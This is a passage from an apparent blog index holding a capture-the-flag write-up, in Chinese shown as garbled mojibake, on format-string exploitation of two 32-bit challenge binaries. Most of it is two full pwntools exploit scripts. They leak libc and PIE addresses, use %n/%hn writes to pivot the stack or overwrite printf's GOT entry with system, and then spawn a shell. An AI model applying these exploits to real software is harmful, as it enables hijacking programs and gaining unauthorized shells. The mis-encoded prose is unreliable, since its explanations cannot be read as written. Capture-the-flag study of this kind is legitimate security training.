å€¼çš„åœ°å€ï¼Œåˆ©ç”¨%nä¿®æ”¹çš„åˆæ˜¯åœ°å€é‡Œçš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¿®æ”¹çš„æ˜¯ä¸Šä¸Šçº§å‡½æ•°ebpï¼Œä¹Ÿå°±æ˜¯main</li><li>ä¸ºä»€ä¹ˆheap_addréœ€è¦-4ï¼Œæˆ‘ä»¬è§‚å¯Ÿåæ±‡ç¼–å‘ç°mainå‡½æ•°åˆ©ç”¨leave å’Œ ret æ¥æ¢å¤å †æ ˆå’Œæ‰§è¡Œï¼Œleaveä¹Ÿå°±ç­‰æ•ˆäºmov esp,ebp ï¼›pop ebpæ¢å¤ï¼Œåœ¨leave espï¼Œebpæ—¶å †æ ˆå·²ç»æå‡åˆ°å †ï¼Œpop ebp ä¼šebp+4ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿›è¡Œ-4ç•™å‡ºç»™fake ebp</li></ul></li><li>ç„¶åæˆ‘ä»¬é€€å‡ºmainå‡½æ•°å°±å¯ä»¥æ‹¿åˆ°shell</li></ol><h3 id="å®Œæ•´expå¦‚ä¸‹"><a href="#å®Œæ•´expå¦‚ä¸‹" class="headerlink" title="å®Œæ•´expå¦‚ä¸‹"></a>å®Œæ•´expå¦‚ä¸‹</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./contacts&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createcontact</span>(<span class="params">name, phone, descrip_len, description</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Contact info: \n&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Name: &#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;You have 10 numbers\n&#x27;</span>)</span><br><span class="line">    io.sendline(phone)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Length of description: &#x27;</span>)</span><br><span class="line">    io.sendline(descrip_len)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;description:\n\t\t&#x27;</span>)</span><br><span class="line">    io.sendline(description)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printcontact</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Contacts:&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x8048C1F&#x27;)</span></span><br><span class="line">payload = <span class="string">&#x27;%31$paaaa&#x27;</span></span><br><span class="line">createcontact(<span class="string">b&#x27;1111&#x27;</span>, <span class="string">b&#x27;1111&#x27;</span>, <span class="string">b&#x27;111&#x27;</span>, payload)</span><br><span class="line">printcontact()</span><br><span class="line">__libc_start_call_main=<span class="built_in">int</span>(ru(<span class="string">b&#x27;aaaa&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;get libc_start_main_ret addr: &#x27;</span> + <span class="built_in">hex</span>(__libc_start_call_main))</span><br><span class="line">__libc_start_main=__libc_start_call_main+<span class="number">0x3B</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line">p(<span class="string">&#x27;bin_sh&#x27;</span>,bin_sh)</span><br><span class="line">payload=<span class="string">b&#x27;%6$p%11$pbbb&#x27;</span>+p32(system)+<span class="string">b&#x27;fake&#x27;</span>+p32(bin_sh)</span><br><span class="line">createcontact(<span class="string">b&#x27;222&#x27;</span>,<span class="string">b&#x27;222&#x27;</span>,<span class="string">b&#x27;222&#x27;</span>,payload)</span><br><span class="line">printcontact()</span><br><span class="line">ru(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">data=ru(<span class="string">b&#x27;bbb&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">data=data.split(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">ebp_addr = <span class="built_in">int</span>(data[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(data[<span class="number">2</span>], <span class="number">16</span>)+<span class="number">12</span></span><br><span class="line">p(<span class="string">&#x27;ebp&#x27;</span>,ebp_addr)</span><br><span class="line">p(<span class="string">&#x27;heap&#x27;</span>,heap_addr)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(heap_addr-<span class="number">4</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%6$n&#x27;</span></span><br><span class="line">createcontact(<span class="string">b&#x27;3333&#x27;</span>, <span class="string">b&#x27;123456789&#x27;</span>, <span class="string">b&#x27;300&#x27;</span>, payload)</span><br><span class="line">printcontact()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ç¬¬äºŒç§æ–¹æ³•-é¡ºè—¤æ‘¸ç“œä¿®æ”¹æ ˆä¸Šåˆé€‚åœ°å€ï¼Œæ”¹å†™got"><a href="#ç¬¬äºŒç§æ–¹æ³•-é¡ºè—¤æ‘¸ç“œä¿®æ”¹æ ˆä¸Šåˆé€‚åœ°å€ï¼Œæ”¹å†™got" class="headerlink" title="ç¬¬äºŒç§æ–¹æ³• é¡ºè—¤æ‘¸ç“œä¿®æ”¹æ ˆä¸Šåˆé€‚åœ°å€ï¼Œæ”¹å†™got"></a>ç¬¬äºŒç§æ–¹æ³• é¡ºè—¤æ‘¸ç“œä¿®æ”¹æ ˆä¸Šåˆé€‚åœ°å€ï¼Œæ”¹å†™got</h2><p>é¢˜ç›®é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1lLW4_0WPbxhORpcDk5GLZw">https://pan.baidu.com/s/1lLW4_0WPbxhORpcDk5GLZw</a><br>æå–ç ï¼šqydx</p><h3 id="æ‹¿åˆ°é¢˜ç›®è¿è¡Œ-1"><a href="#æ‹¿åˆ°é¢˜ç›®è¿è¡Œ-1" class="headerlink" title="æ‹¿åˆ°é¢˜ç›®è¿è¡Œ"></a>æ‹¿åˆ°é¢˜ç›®è¿è¡Œ</h3><p><img src="/2023/02/12/pwn/image-20230212181525295.png" alt="image-20230212181525295"></p><h3 id="æŸ¥çœ‹ä¿æŠ¤-1"><a href="#æŸ¥çœ‹ä¿æŠ¤-1" class="headerlink" title="æŸ¥çœ‹ä¿æŠ¤"></a>æŸ¥çœ‹ä¿æŠ¤</h3><p><img src="/2023/02/12/pwn/image-20230212181617961.png" alt="image-20230212181617961"></p><h3 id="idaåæ±‡ç¼–é™æ€åˆ†æ"><a href="#idaåæ±‡ç¼–é™æ€åˆ†æ" class="headerlink" title="idaåæ±‡ç¼–é™æ€åˆ†æ"></a>idaåæ±‡ç¼–é™æ€åˆ†æ</h3><p><img src="/2023/02/12/pwn/image-20230212181703467.png" alt="image-20230212181703467"></p><p>å¾ˆæ˜æ˜¾çš„æ¼æ´ï¼Œå‘ç°bufåœ¨.bssæ®µï¼ŒåŒæ ·ä¸åœ¨æ ˆåŒº(.bss:æœªåˆå§‹åŒ–çš„å…¨å±€å’Œé™æ€Cå˜é‡ï¼Œä»¥åŠæ‰€æœ‰è¢«åˆå§‹åŒ–ä¸º0çš„å…¨å±€æˆ–é™æ€å˜é‡ã€‚(ç›®æ ‡æ–‡ä»¶è¯¥èŠ‚åœ¨ç£ç›˜ä¸å ç©ºé—´ï¼Œåœ¨è¿è¡Œæ—¶ï¼Œå†…å­˜åˆ†é…ï¼Œåˆå§‹åŒ–0))</p><p><img src="/2023/02/12/pwn/image-20230212181831825.png" alt="image-20230212181831825"></p><p>åŒæ ·æ— æ³•ç›´æ¥åˆ©ç”¨fmtstr_payloadåˆ©ç”¨ï¼Œè¿™æ¬¡æˆ‘ä»¬è§‚å¯Ÿç¨‹åºå‘ç°è¿™æ¬¡ç¨‹åºåœ¨æˆ‘ä»¬å†æ¬¡åˆ°åº•å¯æ§å‚æ•°çš„printfæ²¡æœ‰ä½¿ç”¨printfï¼Œå¯ä»¥ä¿®æ”¹printf gotä¸ºsystemåœ°å€ï¼Œä»è€Œåˆ©ç”¨å¯æ§å‚æ•°ï¼Œæ‹¿åˆ°shellï¼Œç”±äºå¯æ§å‚æ•°åœ¨.bssæ®µï¼Œæˆ‘ä»¬å°±éœ€è¦åˆ©ç”¨å¯æ§å‚æ•°åœ¨åŸæœ‰æ ˆçš„æ•°æ®ä¸Šåšæ–‡ç« </p><h3 id="gdbåŠ¨æ€è°ƒè¯•"><a href="#gdbåŠ¨æ€è°ƒè¯•" class="headerlink" title="gdbåŠ¨æ€è°ƒè¯•"></a>gdbåŠ¨æ€è°ƒè¯•</h3><p>è¾“å…¥%påæ–­ç‚¹æ–­åˆ°printfæ ˆåŒºå¦‚ä¸‹</p><p><img src="/2023/02/12/pwn/image-20230212184115485.png" alt="image-20230212184115485"></p><p>åˆ©ç”¨1å¤„æ ˆåœ°å€ï¼Œä¹Ÿå°±æ˜¯å°†0xffffcfa8åœ°å€å¤„å†…å®¹0xffffcfb8ä¿®æ”¹ä¸º0xffffcfacï¼Œç”±äºå¼€å¯pieä¿æŠ¤ï¼Œ0xffffcfacå¤„æ‰€å­˜å†…å®¹æ˜¯elfæ–‡ä»¶æ‰€å­˜åœ°å€+pieåŸºå€ç”Ÿæˆçš„ï¼Œgotè¡¨ä¹Ÿåœ¨elfæ–‡ä»¶çš„æ•°æ®åŒºï¼Œä¹Ÿæ˜¯æœ‰åœ°å€+pieåŸºåœ°å€ç”Ÿæˆï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åˆ©ç”¨%$hnä¿®æ”¹å…¶ä½å››ä½å³å¯(å°ç«¯åº)ï¼Œbufåœ°å€å¯ä»¥åˆ©ç”¨%$pæ³„éœ²ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è¾“å…¥bufä¸ºprintf_got+payloadï¼Œä¿®æ”¹å…¶gotä¸ºsystemåœ°å€</p><h3 id="expæ„é€ "><a href="#expæ„é€ " class="headerlink" title="expæ„é€ "></a>expæ„é€ </h3><ol><li><p>%p%6$pæ³„éœ²bufå’ŒebpåŸºåœ°å€</p></li><li><p>ebpåŸºåœ°å€+åç§»å¾—åˆ°å¯ä¿®æ”¹çš„æœ‰ä»·å€¼åœ°å€</p></li><li><p>bâ€™%â€™+str((ebpåŸºåœ°å€+åç§»)&amp;0xffff).encode()+bâ€™câ€™+bâ€™%6$hnâ€™ä¿®æ”¹ebpæŒ‡å‘åœ°å€</p></li><li><p>ç”±äºå¼€å¯pieï¼Œéœ€è¦å…ˆåˆ©ç”¨mainè¿”å›åœ°å€æ³„éœ²pieåŸºåœ°å€ï¼Œä»è€Œå¾—åˆ°printf_gotçœŸå®åœ°å€  %11$p</p></li><li><p>bâ€™%â€™+str(printf_got&amp;0xffff).encode()+bâ€™câ€™+bâ€™%10$hnâ€™æ”¹å†™æœ‰ä»·å€¼çš„åœ°å€ä¸ºprintf_got</p></li><li><p>%11$s\x00 åˆ©ç”¨å¸ƒç½®å¥½çš„printf_gotæ³„éœ²printfå‡½æ•°åœ¨libcé‡Œçš„çœŸå®åœ°å€ ä»è€Œdumpåˆ°systemåœ°å€</p></li><li><p>æ”¹å†™printf_gotä¸ºå†…å®¹ä¸ºsystemåœ°å€</p><p><img src="/2023/02/12/pwn/image-20230212185436302.png" alt="image-20230212185436302"></p></li><li><p>ç”±äºä¸¤åœ°å€æœ‰3ä¸ªå­—èŠ‚çš„å·®å¼‚ï¼Œä¸€æ¬¡%$hnåªèƒ½æ”¹å†™2å­—èŠ‚å†…å®¹ï¼Œè€Œæ”¹å†™å››å­—èŠ‚å†…å®¹éœ€è¦çš„è¾“å‡ºä»£ä»·å¤ªå¤§ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æ ˆä¸Šæ‰¾åˆ°å¦ä¸€ä¸ªæœ‰ä»·å€¼çš„åœ°å€é‡å¤ä¸Šé¢1.2.3.5æ­¥éª¤è¿›è¡Œæ”¹å†™ï¼Œæ”¹å†™å…¶ä¸ºprintf_gotåœ°å€çš„åä¸¤å­—èŠ‚åœ°å€</p></li><li><p>æ¥ä¸‹æ¥å°±å¯ä»¥æ„é€ å¸¸è§„payloadæ”¹å†™gotè¾¾åˆ°ç›®çš„</p></li></ol><h3 id="å®Œæ•´exp"><a href="#å®Œæ•´exp" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./fmt_str_level_2_x86&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x130A)&#x27;)</span></span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;%p%6$p&#x27;</span></span><br><span class="line">sla(<span class="string">b&#x27;hello\n&#x27;</span>,payload)</span><br><span class="line">addr=ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">addr=addr.split(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">base1=<span class="built_in">int</span>(addr[<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">buf=<span class="built_in">int</span>(addr[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;base1&#x27;</span>,base1)</span><br><span class="line">p(<span class="string">&#x27;buf&#x27;</span>,buf)</span><br><span class="line">base2=base1+<span class="number">4</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(base2&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%6$hn&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%11$p\x00&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">pie=<span class="built_in">int</span>(r(<span class="number">10</span>),<span class="number">16</span>)-elf.symbols[<span class="string">&#x27;main&#x27;</span>]-<span class="number">30</span></span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">printf_got+=pie</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(printf_got&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%10$hn&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak printf addr</span></span><br><span class="line">sl(<span class="string">b&#x27;%11$s\x00&#x27;</span>)</span><br><span class="line">printf_addr=u32(r(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">base=printf_addr-libc.dump(<span class="string">&quot;printf&quot;</span>)</span><br><span class="line">system_addr=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">p(<span class="string">&#x27;system&#x27;</span>,system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#change base1-4 ---7</span></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((base1-<span class="number">0xc</span>)&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%6$hn&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((printf_got&amp;<span class="number">0xffff</span>)+<span class="number">2</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%10$hn&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sysl=system_addr&amp;<span class="number">0xffff</span></span><br><span class="line">sysh=(system_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sysl).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%11$hn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sysh-sysl).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%7$hn&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">r(sysl+sysh)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">sl(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼šä¸€å®šè¿˜æœ‰å…¶ä»–å§¿åŠ¿æ‹¿åˆ°shellï¼Œåªæ˜¯æˆ‘ä»¬æ‡‚å¾—å¤ªå°‘ä¸çŸ¥é“ç½¢äº†Zzz</p>]]></content>
      
      
      
        <tags>
            
            <tag> Fmtstr </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
